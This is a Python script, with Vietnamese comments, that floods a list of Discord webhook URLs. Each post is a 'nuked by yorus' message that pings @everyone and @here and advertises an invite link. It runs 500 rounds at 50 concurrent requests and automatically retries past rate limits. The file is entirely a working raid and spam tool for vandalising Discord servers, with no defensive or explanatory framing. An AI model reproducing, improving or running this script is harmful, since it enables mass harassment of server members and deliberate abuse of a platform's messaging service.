import aiohttp
import asyncio
import time
import random

TOKEN = "YOUR_BOT_TOKEN_HERE"

# Đọc webhook từ file
with open("webhook_urls.txt", "r", encoding="utf-8") as f:
    webhook_urls = [line.strip() for line in f if line.strip()]

print(f"📨 Đọc được {len(webhook_urls)} webhook")

CONTENT = "### > ||@everyone @here|| nuked by yorus https://discord.com/invite/SjFshsTr2E"

async def send_webhook(session, url, index, total):
    payload = {
        "username": "Yorus On Top",
        "content": CONTENT,
        "allowed_mentions": {"parse": ["everyone", "users", "roles"]}
    }
    
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in [204, 200]:
                print(f"✅ [{index}/{total}] Thành công")
                return True
            elif resp.status == 429:
                data = await resp.json()
                retry_after = data.get("retry_after", 1)
                print(f"⏳ [{index}/{total}] Rate limit, chờ {retry_after}s")
                await asyncio.sleep(retry_after + 0.5)
                async with session.post(url, json=payload) as retry_resp:
                    if retry_resp.status in [204, 200]:
                        print(f"✅ [{index}/{total}] Thành công (retry)")
                        return True
                    else:
                        print(f"❌ [{index}/{total}] Lỗi retry: {retry_resp.status}")
                        return False
            else:
                print(f"❌ [{index}/{total}] Lỗi: {resp.status}")
                return False
    except Exception as e:
        print(f"❌ [{index}/{total}] Exception: {e}")
        return False

async def spam_webhooks(times=5, concurrent=10):
    """Spam nhiều lần với concurrent"""
    semaphore = asyncio.Semaphore(concurrent)
    
    async def limited_send(session, url, idx, total):
        async with semaphore:
            return await send_webhook(session, url, idx, total)
    
    async with aiohttp.ClientSession() as session:
        total_webhooks = len(webhook_urls)
        
        for round_num in range(1, times + 1):
            print(f"\n🔁 Lần {round_num}/{times}")
            
            tasks = []
            for idx, url in enumerate(webhook_urls, 1):
                task = limited_send(session, url, idx, total_webhooks)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            success = sum(1 for r in results if r)
            print(f"📊 Lần {round_num}: {success}/{total_webhooks} thành công")
            
        
        print(f"\n✅ Hoàn thành! Tổng: {times * total_webhooks} lần gửi")

if __name__ == "__main__":
    asyncio.run(spam_webhooks(times=500, concurrent=50))